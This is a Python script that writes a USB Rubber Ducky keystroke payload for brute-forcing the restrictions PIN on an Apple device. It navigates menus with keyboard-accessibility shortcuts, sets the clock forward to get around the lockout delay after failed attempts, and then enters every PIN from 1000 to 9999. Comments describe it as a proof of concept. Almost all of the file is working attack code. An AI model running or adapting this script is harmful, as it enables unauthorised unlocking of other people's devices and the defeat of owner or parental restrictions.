#Define global rubber ducky commands
r = "RIGHT\n"
l = "LEFT\n"
cas = "CTRL-ALT SPACE\n"
d3 = "DELAY 800\n"
d2 = "DELAY 300\n"

rdscriptfile = open ('applebruteforce.txt', 'w')

#Gett rid of "not supported keyboard" popup
s_init = """DEFAULT_DELAY 65
DELAY 2000
RIGHT
RIGHT
CTRL-ALT SPACE
DELAY 400
"""
rdscriptfile.write(s_init)


#Reach restrictions menu using combos of rubber ducky commands (note: depending on the number of apps installed on the targeted device, this section might need customization)
s_reach = r*7 + cas + d2 + r*56 + d2 + r + cas + d3 + r*5

#Define the "change time to a future date to bypass time-based delayed authentication" steps
cdt = 7*r + cas + 58*r + cas + d3 + 49*r + d2 + r + cas + d3 + r + "UP\n" + "ESC\n" + d3

rdscriptfile.write(cdt)

rdscriptfile.write(s_reach)

#Try pin codes from 1000 to 9999 (for the sake of POC and simplicity codes form 0001 to 0999 were not coded as tries)
for pin in range(1000,10000):
    dig1 = int(str(pin)[0])
    dig2 = int(str(pin)[1])
    if dig2 == 0: 
        dig2 = 10
    dig3 = int(str(pin)[2])
    if dig3 == 0:
        dig3 = 10
    dig4 = int(str(pin)[3])
    if dig4 == 0:
        dig4 = 10
    
    pin_brute = ""

    pos1 = dig1 - 1
    pin_brute = r*pos1 + cas + d2
   
    pos2 = dig2 - dig1 
    if pos2 >= 0:
        pin_brute = pin_brute + r*pos2 + cas + d2
    else:
        pin_brute = pin_brute + l*(-pos2) + cas + d2

    pos3 = dig3 - dig2
    if pos3 >= 0:
        pin_brute = pin_brute + r*pos3 + cas + d2
    else:
        pin_brute = pin_brute + l*(-pos3) + cas + d2

    pos4 = dig4 - dig3
    if pos4 >= 0:
        pin_brute = pin_brute + r*pos4 + cas + d2
    else:
        pin_brute = pin_brute + l*(-pos4) + cas + d2
    
    #Write the pin code bruteforce commands to file
    rdscriptfile.write(pin_brute)

    if pin == 1000:
        exitpc = l*(dig4+2) + d2 + cas + d3
    else:
        exitpc = l*(dig4+2) + d2 + l + d2 + cas + d3

    #Write the necessary keystrokes to exit from restrictions code authentication menu
    rdscriptfile.write(exitpc)

    #Change date time to future
    rdscriptfile.write(cdt)

    #Go back to the restrictions menu to try the next pin
    rdscriptfile.write(s_reach)











